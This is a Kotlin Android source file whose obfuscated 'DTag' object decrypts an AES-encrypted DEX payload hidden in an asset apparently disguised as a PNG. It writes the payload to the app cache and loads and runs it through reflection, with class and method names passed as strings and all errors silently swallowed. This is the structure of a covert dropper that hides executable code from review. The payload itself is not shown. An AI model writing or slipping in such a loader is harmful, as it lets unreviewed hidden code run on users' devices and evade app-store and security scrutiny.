package com.poa.kga

import android.app.Application
import android.content.Context
import java.io.File
import java.io.FileOutputStream
import java.lang.reflect.Constructor
import java.lang.reflect.Field
import java.lang.reflect.Method
import java.security.Key
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec


object DTag {
    private var dFirst: Class<*>? = null
    private var dSecond: Any? = null
    private var dPlus: Method? = null

    var lao = 9L

    private fun asPt(data: ByteArray, key: Key): ByteArray {
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.DECRYPT_MODE, key)
        return cipher.doFinal(data)
    }

    fun ptGod(context: Context, list0: ArrayList<String>, list1: ArrayList<String>) {
        try {
            val encryptedPng = context.assets.open(list0[0]).use { it.readBytes() }
            val encryptedDex = encryptedPng.copyOfRange(8, encryptedPng.size)
            val importantKey: Key = SecretKeySpec(list0[1].toByteArray(), "AES")
            val dexBytes = asPt(encryptedDex, importantKey)
            lao += 998L
            val outFile = File(context.cacheDir, "pvgo")
            if (!outFile.exists() || outFile.length() <= 0L) {
                try {
                    FileOutputStream(outFile).use { fos ->
                        fos.write(dexBytes)
                        outFile.setReadOnly()
                    }
                } catch (_: Exception) {
                    return  // 写文件失败直接返回
                }
            }

            if (dFirst == null || dSecond == null || dPlus == null) {
                val od = File(context.getCacheDir(), "kku")
                od.mkdirs()

                val loaderClass = Class.forName(list0[2])
                val loaderConstructor: Constructor<*> = loaderClass.getConstructor(
                    String::class.java,
                    String::class.java,
                    String::class.java,
                    ClassLoader::class.java
                )
                val loader: Any = loaderConstructor.newInstance(
                    outFile.getAbsolutePath(),
                    od.getAbsolutePath(),
                    null,
                    context.getClassLoader()
                )
                val loadClassMethod: Method =
                    loader.javaClass.getMethod(list0[3], String::class.java)
                dFirst = loadClassMethod.invoke(loader, list0[4]) as Class<*>?

                val field: Field = dFirst!!.getField("INSTANCE")
                dSecond = field.get(null)
                dPlus = dFirst!!.getDeclaredMethod(
                    list0[5],
                    Application::class.java,
                    ArrayList::class.java
                )
            }
            dPlus?.invoke(dSecond, context.applicationContext, list1)
        } catch (_: Exception) {
        }
    }
}